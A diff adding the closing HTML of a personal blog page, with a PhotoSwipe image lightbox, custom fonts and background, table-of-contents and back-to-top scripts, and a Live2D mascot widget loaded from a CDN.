+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
